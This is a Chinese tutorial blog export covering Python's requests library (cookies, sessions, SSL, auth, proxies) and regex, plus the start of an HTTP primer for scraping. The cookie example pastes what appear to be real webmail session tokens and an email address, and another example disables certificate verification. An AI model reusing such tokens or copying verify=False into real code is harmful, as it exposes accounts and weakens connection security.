\u0026#34;Accept-Encoding\u0026#34;: \u0026#34;gzip, deflate\u0026#34;, \u0026#34;Content-Length\u0026#34;: \u0026#34;4427\u0026#34;, \u0026#34;Content-Type\u0026#34;: \u0026#34;multipart/form-data; boundary=3f1d8575b6590aa87284daeaf1ebab4a\u0026#34;, \u0026#34;Host\u0026#34;: \u0026#34;httpbin.org\u0026#34;, \u0026#34;User-Agent\u0026#34;: \u0026#34;python-requests/2.28.1\u0026#34;, \u0026#34;X-Amzn-Trace-Id\u0026#34;: \u0026#34;Root=1-65dca3f0-7485d19b3a37ce032285cfc5\u0026#34; }, \u0026#34;json\u0026#34;: null, \u0026#34;origin\u0026#34;: \u0026#34;194.99.79.246\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;http://httpbin.org/post\u0026#34; } 利用files我们就成功通过POST请求上传了一个文件。\nCookie设置 我们先尝试获取cookie\nimport requests r = requests.get(\u0026#34;https://www.baidu.com\u0026#34;) print(r.cookies) for key, value in r.cookies.items(): print(key + \u0026#34;=\u0026#34; + value) 运行结果\n\u0026lt;RequestsCookieJar[\u0026lt;Cookie BDORZ=27315 for .baidu.com/\u0026gt;]\u0026gt; BDORZ=27315 那么现在就可以看到这就是我们截获到的Cookie了，还记得之前讲的Cookie就像是通行证，所以我们先登录一个网站然后用生成的Cookie来替换headers参数看看是否可以登录访问\n首先登录我的126邮箱，然后找到它的Cookie\n接着复制并添加到headers参数里面\nimport requests url = \u0026#34;https://mail.126.com/js6/main.jsp?sid=SFxzVLEEsGskZribnYEEzCuuiOescwUt\u0026amp;df=webmail126#module=welcome.WelcomeModule%7C%7B%7D\u0026#34; headers = { \u0026#34;Cookie\u0026#34;: \u0026#39;nts_mail_user=w1121293707@126.com:-1:1; MAIL_SDID=874273342558449664; locale=; face=js6; MAIL_LOCATION=gz; NTES_SESS=VK5sD5z7nl9YqEkNzX0aaCCq7XSU27vS_b.8k1DWElVGxaw1xYbLveT2wf2_R0Vbz.rvYIKJwo.8mWXUnz.FbeYBS_lfIRdiurUwSQfcyK7DQjl0LfBZoaE8GME9deTNM_sKVZtSL9hkhZxq4YM7OfHAmhxcUUSXO8MRPD9q7V.ucDKWsdmD0H6KOpTc564bWXG2brXGvoOSfcNZqodIxStAW; S_INFO=1709045762|0|#3\u0026amp;80#|w1121293707@126.com; P_INFO=w1121293707@126.com|1709045762|0|mail126|00\u0026amp;99|sxi\u0026amp;1708854921\u0026amp;mail126#sxi\u0026amp;610100#10#0#0|\u0026amp;0|mail126|w1121293707@126.com; mail_idc=\u0026#34;\u0026#34;; Coremail=7e63eb7de5574%SFxzVLEEsGskZribnYEEzCuuiOescwUt%wmsvr-41-106.mail.126.com; MAIL_ENTRY_INFO=1|0|mail126|webmail126|124.89.2.73|2fd8275d91a844e31dcc47f615d9df3b_v1||874273342558449664|1709045763|0; MAIL_ENTRY_CS=4013070295d8ed2148c0900b8bd1e7c6; mixmailTokens=1E1StjlbA-RsybFpsvpXmtOyfRGomvqnWPmwQQZz1N_0Co3MVdUHWlLjvlUgHo2flCGcsF73ZG4eh1rF9fGYegI2Gy0PzxGZLwKjGJMF13PjrCLVEI6eeWBnYFOpdp07vYMl1h49M23HAS4ZnL-eaQMVg; MAIL_MISC=\u0026#34;w1121293707@126.com\u0026#34;; cm_last_info=dT13MTEyMTI5MzcwNyU0MDEyNi5jb20mZD1odHRwcyUzQSUyRiUyRm1haWwuMTI2LmNvbSUyRmpzNiUyRm1haW4uanNwJTNGc2lkJTNEU0Z4elZMRUVzR3NrWnJpYm5ZRUV6Q3V1aU9lc2N3VXQmcz1TRnh6VkxFRXNHc2tacmlibllFRXpDdXVpT2VzY3dVdCZoPWh0dHBzJTNBJTJGJTJGbWFpbC4xMjYuY29tJTJGanM2JTJGbWFpbi5qc3AlM0ZzaWQlM0RTRnh6VkxFRXNHc2tacmlibllFRXpDdXVpT2VzY3dVdCZ3PWh0dHBzJTNBJTJGJTJGbWFpbC4xMjYuY29tJmw9LTEmdD0tMSZhcz10cnVl; MAIL_SESS=VK5sD5z7nl9YqEkNzX0aaCCq7XSU27vS_b.8k1DWElVGxaw1xYbLveT2wf2_R0Vbz.rvYIKJwo.8mWXUnz.FbeYBS_lfIRdiurUwSQfcyK7DQjl0LfBZoaE8GME9deTNM_sKVZtSL9hkhZxq4YM7OfHAmhxcUUSXO8MRPD9q7V.ucDKWsdmD0H6KOpTc564bWXG2brXGvoOSfcNZqodIxStAW; MAIL_SINFO=\u0026#34;1709045762|0|#3\u0026amp;80#|w1121293707@126.com\u0026#34;; MAIL_PINFO=\u0026#34;w1121293707@126.com|1709045762|0|mail126|00\u0026amp;99|sxi\u0026amp;1708854921\u0026amp;mail126#sxi\u0026amp;610100#10#0#0|\u0026amp;0|mail126|w1121293707@126.com\u0026#34;; secu_info=1; mail_entry_sess=0859964f9866bb8c26b8fb64bff6baf1ee1cbbe3527f054da14400f1a9bf1cfaf8d12c4f89f9f4c1566860bbab761a5056fa151a418041eb884f4c80ef24a6d9dfb5dc3e2dd1cc19edc67c72bffc666073f8920566b6444b98eb0d8f14e5986b58173ad7ba751674d600f8ac802f320cc96a28d33200651300cdd96817b6713f71d5559e9d5c1b6b0eb9e063aee25969ed8278858b298bdc143de44d3296d56e5e52e0fd3ceb24a633d8a1756d4c8d6459358118b3a5745f2a91dad340c4d430; JSESSIONID=E357320184AF7ACB567AE3CEE389544C; Coremail.sid=SFxzVLEEsGskZribnYEEzCuuiOescwUt; mail_style=js6; mail_uid=w1121293707@126.com; mail_host=mail.126.com; stats_session_id=32bf5635-1d0e-4200-a853-3b279a557c3b\u0026#39; } resp = requests.get(url, headers=headers) print(resp.text) 运行结果\n这就表明我们通过设置Cookie的信息，成功模拟了登录状态。、\n除了设置headers参数外，也可以设置cookies参数。在前面实例中看到了我们截获的cookie是RequestsCookieJar对象类型，所以我们可以新建一个RequestsCookieJar对象 ，然后赋值给cookies参数\nimport requests url = \u0026#34;https://mail.126.com/js6/main.jsp?sid=SFxzVLEEsGskZribnYEEzCuuiOescwUt\u0026amp;df=webmail126#module=welcome.WelcomeModule%7C%7B%7D\u0026#34; cookies = \u0026#39;nts_mail_user=w1121293707@126.com:-1:1; MAIL_SDID=874273342558449664; locale=; face=js6; MAIL_LOCATION=gz; NTES_SESS=VK5sD5z7nl9YqEkNzX0aaCCq7XSU27vS_b.8k1DWElVGxaw1xYbLveT2wf2_R0Vbz.rvYIKJwo.8mWXUnz.FbeYBS_lfIRdiurUwSQfcyK7DQjl0LfBZoaE8GME9deTNM_sKVZtSL9hkhZxq4YM7OfHAmhxcUUSXO8MRPD9q7V.ucDKWsdmD0H6KOpTc564bWXG2brXGvoOSfcNZqodIxStAW; S_INFO=1709045762|0|#3\u0026amp;80#|w1121293707@126.com; P_INFO=w1121293707@126.com|1709045762|0|mail126|00\u0026amp;99|sxi\u0026amp;1708854921\u0026amp;mail126#sxi\u0026amp;610100#10#0#0|\u0026amp;0|mail126|w1121293707@126.com; mail_idc=\u0026#34;\u0026#34;; Coremail=7e63eb7de5574%SFxzVLEEsGskZribnYEEzCuuiOescwUt%wmsvr-41-106.mail.126.com; MAIL_ENTRY_INFO=1|0|mail126|webmail126|124.89.2.73|2fd8275d91a844e31dcc47f615d9df3b_v1||874273342558449664|1709045763|0; MAIL_ENTRY_CS=4013070295d8ed2148c0900b8bd1e7c6; mixmailTokens=1E1StjlbA-RsybFpsvpXmtOyfRGomvqnWPmwQQZz1N_0Co3MVdUHWlLjvlUgHo2flCGcsF73ZG4eh1rF9fGYegI2Gy0PzxGZLwKjGJMF13PjrCLVEI6eeWBnYFOpdp07vYMl1h49M23HAS4ZnL-eaQMVg; MAIL_MISC=\u0026#34;w1121293707@126.com\u0026#34;; cm_last_info=dT13MTEyMTI5MzcwNyU0MDEyNi5jb20mZD1odHRwcyUzQSUyRiUyRm1haWwuMTI2LmNvbSUyRmpzNiUyRm1haW4uanNwJTNGc2lkJTNEU0Z4elZMRUVzR3NrWnJpYm5ZRUV6Q3V1aU9lc2N3VXQmcz1TRnh6VkxFRXNHc2tacmlibllFRXpDdXVpT2VzY3dVdCZoPWh0dHBzJTNBJTJGJTJGbWFpbC4xMjYuY29tJTJGanM2JTJGbWFpbi5qc3AlM0ZzaWQlM0RTRnh6VkxFRXNHc2tacmlibllFRXpDdXVpT2VzY3dVdCZ3PWh0dHBzJTNBJTJGJTJGbWFpbC4xMjYuY29tJmw9LTEmdD0tMSZhcz10cnVl; MAIL_SESS=VK5sD5z7nl9YqEkNzX0aaCCq7XSU27vS_b.8k1DWElVGxaw1xYbLveT2wf2_R0Vbz.rvYIKJwo.8mWXUnz.FbeYBS_lfIRdiurUwSQfcyK7DQjl0LfBZoaE8GME9deTNM_sKVZtSL9hkhZxq4YM7OfHAmhxcUUSXO8MRPD9q7V.ucDKWsdmD0H6KOpTc564bWXG2brXGvoOSfcNZqodIxStAW; MAIL_SINFO=\u0026#34;1709045762|0|#3\u0026amp;80#|w1121293707@126.com\u0026#34;; MAIL_PINFO=\u0026#34;w1121293707@126.com|1709045762|0|mail126|00\u0026amp;99|sxi\u0026amp;1708854921\u0026amp;mail126#sxi\u0026amp;610100#10#0#0|\u0026amp;0|mail126|w1121293707@126.com\u0026#34;; secu_info=1; mail_entry_sess=0859964f9866bb8c26b8fb64bff6baf1ee1cbbe3527f054da14400f1a9bf1cfaf8d12c4f89f9f4c1566860bbab761a5056fa151a418041eb884f4c80ef24a6d9dfb5dc3e2dd1cc19edc67c72bffc666073f8920566b6444b98eb0d8f14e5986b58173ad7ba751674d600f8ac802f320cc96a28d33200651300cdd96817b6713f71d5559e9d5c1b6b0eb9e063aee25969ed8278858b298bdc143de44d3296d56e5e52e0fd3ceb24a633d8a1756d4c8d6459358118b3a5745f2a91dad340c4d430; JSESSIONID=E357320184AF7ACB567AE3CEE389544C; Coremail.sid=SFxzVLEEsGskZribnYEEzCuuiOescwUt; mail_style=js6; mail_uid=w1121293707@126.com; mail_host=mail.126.com; stats_session_id=32bf5635-1d0e-4200-a853-3b279a557c3b\u0026#39; jar = requests.cookies.RequestsCookieJar() for cookie in cookies.split(\u0026#39;;\u0026#39;): key, value = cookie.split(\u0026#39;=\u0026#39;, 1) jar.set(key, value) resp = requests.get(url, cookies=jar) print(resp.text) 运行结果\n测试发现，依然可以正常登录\nSession维持 在利用requests库时，我们无论使用GET还是POST请求，都是当作开启了一个新的浏览器，然后去访问网站的。比如你先用POST请求输入了你的登录信息，之后你再使用GET请求还是会无法访问。\nimport requests requests.get(\u0026#34;https://www.httpbin.org/cookies/set/number/123456789\u0026#34;) resp = requests.get(\u0026#34;https://www.httpbin.org/cookies\u0026#34;) print(resp.text) 运行结果\n{ \u0026#34;cookies\u0026#34;: {} } 所以一个解决办法就是像上面一节的例子，设置cookie参数即可，但这样比较麻烦。因为你需要先去浏览器上登录网站，然后再复制cookie头的内容。\n那么如果不想重复复制粘贴cookie内容的话，我们可以利用session对象，只要维护好一个session对象，cookie也就不成问题了。\nimport requests s = requests.session() s.get(\u0026#34;https://www.httpbin.org/cookies/set/number/123456789\u0026#34;) resp = s.get(\u0026#34;https://www.httpbin.org/cookies\u0026#34;) print(resp.text) 运行结果\n{ \u0026#34;cookies\u0026#34;: { \u0026#34;number\u0026#34;: \u0026#34;123456789\u0026#34; } } SSL证书验证 现在很多网站都用的https协议，但是有些网站没有安装HTTPS证书或者HTTPS证书不被ca机构认可，这就导致我们在访问的时候可能会出现SSL证书错误的提示。\n比如我们现在访问https://ssr2.scrape.center\n但是我们用requests库的话，就会无法访问\nimport requests resp = requests.get(\u0026#34;https://ssr2.scrape.center\u0026#34;) print(resp.text) 运行结果如下\n可以看见它抛出了SSLError错误\n那么如果我们一定要访问该网站呢，可以使用verify参数，这个参数使用来控制证书的，默认为true，如果将它设置为false，那么在请求时就不会再验证证书。\nimport requests resp = requests.get(\u0026#34;https://ssr2.scrape.center/\u0026#34;, verify=False) print(resp.status_code) 运行结果\nD:\\python\\lib\\site-packages\\urllib3\\connectionpool.py:1045: InsecureRequestWarning: Unverified HTTPS request is being made to host \u0026#39;ssr2.scrape.center\u0026#39;. Adding certificate verification is strongly advised. See: https://urllib3.readthedocs.io/en/1.26.x/advanced-usage.html#ssl-warnings warnings.warn( 200 状态码为200，这就是表示我们已经访问成功了。\n不过呢，上面还是有一段警告，它是建议我们给他指定证书。如果我们想要忽略它的话可以通过设置忽略警告的方式来屏蔽这个警告。\nimport requests from requests.packages import urllib3 urllib3.disable_warnings() resp = requests.get(\u0026#34;https://ssr2.scrape.center\u0026#34;, verify=False) print(resp.status_code) 运行结果\n200 可以看到那段长长的警告不见了\n还有两种方法可以忽略警告\n捕获警告到日志的方式忽略警告：\nimport requests import logging logging.captureWarnings(True) resp = requests.get(\u0026#34;https://ssr2.scrape.center\u0026#34;, verify=False) print(resp.status_code) 运行结果\n200 或者我们可以直接指定一个本地证书作为客户端证书\nimport requests resp = requests.get(\u0026#34;https://ssr2.scrape.center\u0026#34;, cert=(\u0026#39;/path/server.crt\u0026#39;, \u0026#39;/path/server.key\u0026#39;)) print(resp.status_code) 运行结果\n200 超时设置 平常在上网的时候就可能会因为网络状况不好或者服务器网络响应太慢导致需要等待一段时间网站才能加载出来，甚至最后因为接收不到响应而报错。\n所以我们可以通过设置超时时间，就是如果加载到一定时间还是没有响应，就直接跳过。\nimport requests resp = requests.get(\u0026#34;http://www.httpbin.org\u0026#34;, timeout=1) print(resp.text) 但是这里的timeout参数是连接和读取的时间总和，如果想要分别设置连接和读取的时间，可以用元组类型\nimport requests resp = requests.get(\u0026#34;http://www.httpbin.org\u0026#34;, timeout=(5, 10)) print(resp.text) 身份认证 （OAUTH未） 在访问某些网站的时候，通常会弹出登录弹窗，进行身份认证，比如访问https://ssr3.scrape.center时，就会出现一个登录弹窗\n怎么解决这个问题呢，要知道requests模块是一个强大的库，它里面可以通过设置auth参数来通过身份认证。\nimport requests from requests.auth import HTTPBasicAuth resp = requests.get(\u0026#34;https://ssr3.scrape.center\u0026#34;, auth=HTTPBasicAuth(\u0026#34;admin\u0026#34;, \u0026#34;admin\u0026#34;)) print(resp.status_code) 运行结果\n200 除此之外，requests库还提供其他认证方式，比如OAuth认证\nimport requests from requests_oauthlib import OAuth1 url = \u0026#34;https://api.twitter.com/1.1/account/verify_credentials.json\u0026#34; auth = OAuth1(\u0026#34;YOUR_APP_KEY\u0026#34;, \u0026#34;YOUR_APP_SECRET\u0026#34;, \u0026#34;USER_OAUTH_TOKEN\u0026#34;, \u0026#34;USER_OAUTH_TOKEN_SECRET\u0026#34;) resp = requests.get(url, auth=auth) print(resp.status_code) 运行结果\n200 代理设置 经常对某个网站进行爬虫时，前几次可以好好访问，但后面就会出现访问失败的情况。这就是网站的反爬技术，它们如果检测到某个IP在进行不正常访问时，就会判断其为爬虫，然后就会将该IP加入黑名单，这样就无法继续访问了。\n如何解决这个问题呢，既然不允许一个IP多次访问的话，那么我们用多个IP依次去访问时，不就可以通过时间差使之IP在正常访问。\n这时我们就要用到proxies参数。下面展示例子：\nimport requests proxies = { \u0026#34;http\u0026#34;: \u0026#34;http://10.10.10.10:1080\u0026#34;, \u0026#34;https\u0026#34;: \u0026#34;http://10.10.10.10:1080\u0026#34; } requests.get(\u0026#34;https://httpbin.org/get\u0026#34;, proxies=proxies) 这个例子无法执行，如果要利用的话还是要去搜索有效的代理IP。\n同时requests模块还支持SOCK协议\nimport requests proxies = { \u0026#34;http\u0026#34;: \u0026#34;sock5://10.10.10.10:1080\u0026#34;, \u0026#34;https\u0026#34;: \u0026#34;sock5://10.10.10.10:1080\u0026#34; } requests.get(\u0026#34;https://httpbin.org/get\u0026#34;, proxies=proxies) Prepare Request 我们知道使用get、post方法就可以实现向其他网站的请求动作，那么它们在requests模块的内部是怎么实现的呢？\n在发送请求之前，requests模块构造一个Request对象，然后将url、header、data等信息添加进去，最终将这个Request对象发送出去，在请求成功后就会获取Response对象，接下来就是对Response对象进行解析。Request对象的类型就是Prepare Request\n接下来我们尝试不使用get方法发送一条请求\nfrom requests import Request, Session url = \u0026#34;https://httpbin.org/post\u0026#34; data = {\u0026#34;name\u0026#34;: \u0026#34;winglet\u0026#34;} headers = { \u0026#34;User-Agent\u0026#34;: \u0026#34;Mozilla / 5.0(Windows NT 10.0; Win64; x64) AppleWebKit / 537.36(KHTML, like Gecko) Chrome / 80.0.3987.122 Safari / 537.36\u0026#34; } s = Session() req = Request(\u0026#39;POST\u0026#39;, url=url, data=data, headers=headers) prepped = s.prepare_request(req) r = s.send(prepped) print(r.text) 运行结果如下\n{ \u0026#34;args\u0026#34;: {}, \u0026#34;data\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;files\u0026#34;: {}, \u0026#34;form\u0026#34;: { \u0026#34;name\u0026#34;: \u0026#34;winglet\u0026#34; }, \u0026#34;headers\u0026#34;: { \u0026#34;Accept\u0026#34;: \u0026#34;*/*\u0026#34;, \u0026#34;Accept-Encoding\u0026#34;: \u0026#34;gzip, deflate\u0026#34;, \u0026#34;Content-Length\u0026#34;: \u0026#34;12\u0026#34;, \u0026#34;Content-Type\u0026#34;: \u0026#34;application/x-www-form-urlencoded\u0026#34;, \u0026#34;Host\u0026#34;: \u0026#34;httpbin.org\u0026#34;, \u0026#34;User-Agent\u0026#34;: \u0026#34;Mozilla / 5.0(Windows NT 10.0; Win64; x64) AppleWebKit / 537.36(KHTML, like Gecko) Chrome / 80.0.3987.122 Safari / 537.36\u0026#34;, \u0026#34;X-Amzn-Trace-Id\u0026#34;: \u0026#34;Root=1-65f2cab2-1df53d590a48a2df49f2fa16\u0026#34; }, \u0026#34;json\u0026#34;: null, \u0026#34;origin\u0026#34;: \u0026#34;92.223.121.116\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://httpbin.org/post\u0026#34; } 可以看到，达到了和POST请求一样的效果。而这个Request对象已经成为一个独立的对象了，所以我们可以直接操作它。\n正则表达式（re） 简单介绍 现在给出一条数据\nmy phone number is 010-86432100 如果我们现在只想要电话号码的话，就需要编写一条正则表达式\n当然这个只是一个比较简单的正则匹配，但效果大家都看见了，我们可以通过一条正则表达式，来匹配一段数据中我们关注的部分。\nmatch 这里先介绍第一个常用的匹配方法——match，我们只需要像它传入要匹配的字符串以及正则表达式，他就可以检测这个正则表达式是否与字符串相匹配。\nimport re content = \u0026#34;Hello 123 4567 world_This is a Regex Demo\u0026#34; print(len(content)) result = re.match(\u0026#39;^Hello\\s\\d\\d\\d\\s\\d{4}\\s\\w{10}\u0026#39;, content) print(result) print(result.group()) // 输出匹配到的内容 print(result.span()) // 输出匹配的范围 运行结果\n41 \u0026lt;re.Match object; span=(0, 25), match=\u0026#39;Hello 123 4567 world_This\u0026#39;\u0026gt; Hello 123 4567 world_This (0, 25) 匹配目标 我们在上面实现了用match匹配内容，那么现在我们要的就是只取出字符串的一部分。\nimport re content = \u0026#34;Hello 1234567 World_This is a Regex Demo\u0026#34; print(len(content)) result = re.match(\u0026#39;^Hello\\s+(\\d+)\\s+World\u0026#39;, content) print(result) print(result.group()) print(result.group(1)) // 会输出完整的匹配结果 print(result.span()) 运行结果\n40 \u0026lt;re.Match object; span=(0, 19), match=\u0026#39;Hello 1234567 World\u0026#39;\u0026gt; Hello 1234567 World 1234567 (0, 19) 通用匹配 通过上面例子可以发现我们匹配时总是要写很多\\d \\s之类的，其实在正则表达式中式存在能全部匹配的表达式的。就是即将介绍的.*\n. 可以匹配任意字符 * 可以匹配前面的字符无限次 但是当它们组合到一起时，就能够实现匹配任意字符了 我们现在稍微修改一下之前的代码\nimport re content = \u0026#34;Hello 1234567 World_This is a Regex Demo\u0026#34; print(len(content)) result = re.match(\u0026#39;^Hello.*Demo\u0026#39;, content) print(result) print(result.group()) print(result.span()) 运行结果\n40 \u0026lt;re.Match object; span=(0, 40), match=\u0026#39;Hello 1234567 World_This is a Regex Demo\u0026#39;\u0026gt; Hello 1234567 World_This is a Regex Demo (0, 40) 贪婪与非贪婪 我们有时在使用.*时常常得不到我们想要的结果。比如现在我们想要匹配中间的所有数字\nimport re content = \u0026#34;Hello 1234567 World_This is a Regex Demo\u0026#34; result = re.match(\u0026#34;^He.*(\\d+).*Demo$\u0026#34;, content) print(result) print(result.group(1)) 运行结果\n\u0026lt;re.Match object; span=(0, 40), match=\u0026#39;Hello 1234567 World_This is a Regex Demo\u0026#39;\u0026gt; 7 我们只匹配到了一个7数字，这显然不是我们想要的结果。\n这里就要涉及贪婪和非贪婪匹配机制了。在贪婪匹配下,.*会尽可能匹配多的字符。以上面的表达式为例.*后面的是\\d+，它至少会匹配一个数字。所以在我们没有指定几个数字的情况下，.*就会尽可能地匹配多的字符，这就导致123456都被匹配了，只留了7给\\d+去匹配，所以我们最后得到的只有一个7，那么这时我们就要用到非贪婪模式了，它的写法就是?\nimport re content = \u0026#34;Hello 1234567 World_This is a Regex Demo\u0026#34; result = re.match(\u0026#34;^He.*?(\\d+).*Demo$\u0026#34;, content) print(result) print(result.group(1)) 运行结果\n\u0026lt;re.Match object; span=(0, 40), match=\u0026#39;Hello 1234567 World_This is a Regex Demo\u0026#39;\u0026gt; 1234567 可以看见我们只是在.*后面加了一个?，就可以使它只匹配到1之前。在非贪婪模式下，.*?会尽可能匹配少的字符，所以当它匹配到1前面的空格符后，就会把数字全交给\\d+去进行匹配，自己就歇着去了。.*?经常会被用在中间进行匹配。\n要注意的一点就是.*?如果放在字符串的结尾，就有可能匹配不到任何内容了。\nimport re content = \u0026#34;http://weibo.com/comment/kEraCN\u0026#34; result1 = re.match(\u0026#34;http.*?comment/(.*?)\u0026#34;, content) result2 = re.match(\u0026#34;http.*?comment/(.*)\u0026#34;, content) print(result1.group()) print(result2.group()) 运行结果\nhttp://weibo.com/comment/ http://weibo.com/comment/kEraCN 修饰符 先举个例子\nimport re content = \u0026#39;\u0026#39;\u0026#39;Hello 1234567 World_this is a Winglet Demo \u0026#39;\u0026#39;\u0026#39; result = re.match(\u0026#39;^He.*?(\\d+).*?Demo$\u0026#39;, content) print(result.group(1)) 运行结果\nTraceback (most recent call last): File \u0026#34;D:\\pyproject\\爬虫\\测试.py\u0026#34;, line 7, in \u0026lt;module\u0026gt; print(result.group(1)) AttributeError: \u0026#39;NoneType\u0026#39; object has no attribute \u0026#39;group\u0026#39; 这里因为字符串中出现了换行符导致无法匹配，但是只要我们在后面加上一个re.S，就可以解决这个错误。\nimport re content = \u0026#39;\u0026#39;\u0026#39;Hello 1234567 World_this is a Winglet Demo \u0026#39;\u0026#39;\u0026#39; result = re.match(\u0026#39;^He.*?(\\d+).*?Demo$\u0026#39;, content, re.S) print(result.group()) 运行结果\nHello 1234567 World_this is a Winglet Demo 除此之外还有一些别的修饰符\n修饰符 描述 re.I 使匹配对大小写不敏感 re.M 多行匹配，影响 ^ 和 $ re.L 实现本地化识别 (locale-aware) 匹配 re.S 使匹配内容包括换行符在内的所有字符 re.U 根据Unicode字符集解析字符。这个标志会影响\\w、\\W、\\b和\\B re.X 该标志能给予你更灵活的格式，以便将正则变大时 常用的就是re.S和re.I\n转义匹配 举个例子\nimport re content = \u0026#34;(百度) www.baidu.com\u0026#34; result = re.match(\u0026#39;\\(百度\\) www\\.baidu\\.com\u0026#39;, content) print(result) 运行结果\n\u0026lt;re.Match object; span=(0, 18), match=\u0026#39;(百度) www.baidu.com\u0026#39;\u0026gt; 可以看见我们如果想要匹配一些符号的话就可以在前面加上\\，进行字符转义\nsearch match方法是从字符串的第一个字符开始匹配的，所以如果一旦第一个字符就匹配失败了，那么这整个字符串就无法匹配。而我们一般都是会匹配中间部分重要的信息，所以这里就要介绍到一个新的方法search\n这个方法会先扫描整个字符串，然后会从第一个匹配到的字符开始匹配\n例子如下\nimport re content = \u0026#34;Extra string Hello 1234567 World_This is a Regex Demo Extra stings\u0026#34; result = re.search(\u0026#39;Hello.*?(\\d+).*?Demo\u0026#39;, content) print(result.group()) 运行如下\nHello 1234567 World_This is a Regex Demo findall ","date":"2024-02-16T20:51:43+08:00","image":"https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img//img/2402262226.jpg","permalink":"https://blog.winglet.com/p/python%E5%9F%BA%E6%9C%AC%E5%BA%93%E4%BD%BF%E7%94%A8%E6%9B%B4%E6%96%B0%E4%B8%AD/","title":"Python基本库使用[更新中]"},{"content":"前言 ​\t在我成功部署好我这个博客的时候，就发过一个爬虫代码的文章，并且说过以后写写爬虫基础的文章，那么如今就开始写相关的文章。说到爬虫，我去学习的原因只是因为当时面试实验室的时候（一个月后被实验室踢了，成自由人了），学长问了一句，当时我确实不会。后面就去学了一下，还爬了几个壁纸网站，但后面就没再深入学习了。但是在学习爬虫的过程中，得到的知识却在后面经常起到很大的作用，尤其是一年多后爬图书管理信息的时候，我又一次意识到它的作用，所以从现在开始我决定去深入学习一下爬虫。\n参考资料\n《python3网络爬虫开发实战》第二版 HTTP基础 爬虫是一直和web打招呼的，所以我们先从web基础知识讲起。\nURL和URI URI： 全称Uniform Resource Identifier（统一资源标志符）\nURL： 全称Uniform Resource Locator（统一资源定位符）\n例如http://github.com/favicon.ico这个既是URL也是URI，它的作用就是准确定位到favicon.ico文件的位置，我们要通过它去访问或获取这个文件，这个能准确访问指定文件的链接就是URL/URI。一条访问链接它需要包括了HTTP协议、访问路径(根目录)和资源名称。\nURL和URI的关系是包含关系，也就是说URL一定是URI, 但URI不一定是URL。因为URI中还包含URN。URN的作用只是为资源命名但不具有指定资源位置的功能，比如它可以指定一本书为urn:isbn:014235454,但它并没有指定我们去哪里去找到这个本书。它们的关系如下图\n但是URL也不是乱写的，它需要遵守一定的格式，基本组成格式如下：\nscheme://[username:password@]hostname[:port][/path][;parameters][?query][#fragment]\nscheme: 协议。常用的协议有http、https、ftp username,password: 账号密码。这个比较少见，某些情况下需要账号和密码才能访问URL。https://admin:admin@ssr3.scrape.center hostname: 主机地址。可以是域名或是IP。ww.baidu.com port: 端口号。我们访问网页时默认时80或8080端口，有时要访问特定网页时需要加上端口。http://localhost:1313 path: 路径。网络资源在服务器中的指定地址。https://github.com/favicon.ico中favicon就是path parameters: 参数。访问网络资源的附加信息，很少见现在都以?query作为参数。https://8.8.8.8:12345/hello;user query: 查询。用来查询某类资源，有多个查询时用\u0026amp;隔开。http://localhost:8080/1.php?s=wwww fragment: 片段。对资源描述的描述补充。通常是作为路由管理或者翻页下滑滚动到特定位置。 HTTP和HTTPS HTTP： 全称是Hypertext Transfer Protocol，即超文本传输协议，作用是把超文本数据从网络传输到本地浏览器，能够确保高效而准确地传输超文本文档。目前常用的是HTTP 1.1版本， 不过目前也有不少网站有使用HTTP 2.0版本趋势。\nHTTPS: ** 全称是Hypertext Transfer Protocol over Secure Socket Layer，说白了就是HTTP的安全版本。它的安全基础是SSL**,因此通过该协议的数据都必须经过SSL的加密。\nSSL的作用：1. 建立一个信息安全通道，确保数据传输的安全性。 2. 确认网络的真实性。现在用HTTPS协议的网站，都可以查询到它的认证真实信息，并且都有ca机构办法的安全签章。 现在很多网站用的都是HTTPS协议，毕竟一个有安全保障，一个无安全保障，都知道应该选择哪个。HTTP经常会在我们建立本地网站的时候使用。\nHTTP和HTTPS协议都属于计算机网络中的应用层协议，其下层是基于TCP协议实现的。而TCP协议属于计算机网络的传输层协议，它建立了连接时的三次握手和四次挥手。 HTTP请求过程 我们通常通过在浏览器的地址栏上输入URL，就成功访问到了指定网页。但其实是浏览器先将我们的URL请求发送给对应的服务器，然后服务器接受请求并进行处理和解析后，返回给对应的响应，接着传回给浏览器。由于响应包中包含着页面的源代码，浏览器便将它们解析执行，并最终将网页呈现出来。\n为了更好理解我们使用chrome浏览器，并访问www.baidu.com。访问成功后，按下F12然后看network（网络）面板\n可以看见network面板下有很多条目，每一个条目就代表着进行了一次请求和响应。我们先看看www.baidu.com条目\n名称: 请求的名称。一般会以URL的最后部分作为名称 状态: 状态码 类型: 请求文档的类型 启动器: 请求源。标记请求是由哪个对象或进程发起的 大小: 从服务器请求的资源大小。 时间: 从发起请求到获得响应花的时间。 瀑布: 网络请求的可视化瀑布流。 接下来单击这个条目，看看跟详细的内容。\n这里分有常规、响应标头、请求标头这三个类型。\n请求 请求方法 我们常见的请求方法就是GET和POST这两种请求方法。GET方法的格式就是 www.baidu.com/?wd=ddd 这个URL包含了query信息，通常用于我们查询某些数据或提交某些信息。POST请求方法是提交一个表单，这个方法通常是我们提交登录信息的时候使用。\n它们的区分有以下特点：\nGET方法提交的数据我们可以直接在URL上看见，POST方法提交的数据我们看不见，只能使用一些抓包软件才能看见其内容 GET方法提交的数据有大小限制为1024字节，POST提交的数据没有大小限制。 当然除了这两种请求方法还有其他的。\n方法 描述 GET 请求页面，并返回页面内容 POST 大多用于提交表单或者上传文件，数据包含在请求体中。 PUT 用客户端传向服务器的数据取代指定文档中的内容 HEAD 类似GET请求方法，不过返回的响应种没有具体内容。用于获取报头 DELETE 请求服务器删除指定的页面 CONNECT 把服务器当作跳板，让服务器代替客户端访问其他页面 OPTIONS 允许客户端查看服务器的性能 TRACE 回显服务器收到的请求。主要用于诊断或测试 请求的网址 请求的网址，它可以确定唯一的客户端想请求的资源。其实就是URL\n请求头 请求头，用来说明服务器的附加信息，其中有几个很重要。\nAccept: 请求报头域，用于指定客户端可接受哪些类型的信息 Accept-Language: 用于指定客户端可接受的语言类型 Accept-Encoding: 用于指定客户端可接受的内容编码 Host: 用于指定请求资源的主机IP和端口号。其内容为请求URL的原始服务器或网关的位置 Cookie: 网站用于辨识用户，进行会话跟踪而存储在用户本地的数据。主要功能是维持当前访问会话。 Referer: 用于标识请求时从哪个页面发送过来的 User-Agent: 可以使服务器识别客户端使用的操作系统及版本，浏览器及版本等信息。写爬虫时用上这个可以伪装成浏览器 Content-Type: 